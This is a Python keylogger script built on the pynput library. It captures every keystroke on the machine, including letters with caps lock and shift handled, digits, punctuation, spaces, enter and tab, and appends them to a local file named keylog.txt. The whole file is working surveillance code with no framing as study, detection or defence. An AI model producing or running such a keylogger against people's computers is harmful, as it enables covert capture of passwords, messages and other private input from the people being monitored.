from pynput import keyboard
import string

caps_on = False
shift_pressed = False

valid_chars = string.ascii_letters + string.digits + string.punctuation

def write(char):
    try:
        with open("keylog.txt", "a") as f:
            f.write(char)
    except Exception as e:
        print(e)

def on_press(key):
    global caps_on, shift_pressed

    try:
        if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
            shift_pressed = True

        elif key == keyboard.Key.caps_lock:
            caps_on = not caps_on

        elif key == keyboard.Key.space:
            write(" ")

        elif key == keyboard.Key.enter:
            write("\n")

        elif key == keyboard.Key.tab:
            write("\t")

        elif hasattr(key, 'char') and key.char:
            char = key.char
            if char in string.ascii_letters:

                if caps_on ^ shift_pressed:
                    write(char.upper())
                else:
                    write(char.lower())
            elif char in string.digits + string.punctuation:
                write(char)

    except Exception as e:
        print(e)

def on_release(key):
    global shift_pressed
    if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
        shift_pressed = False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
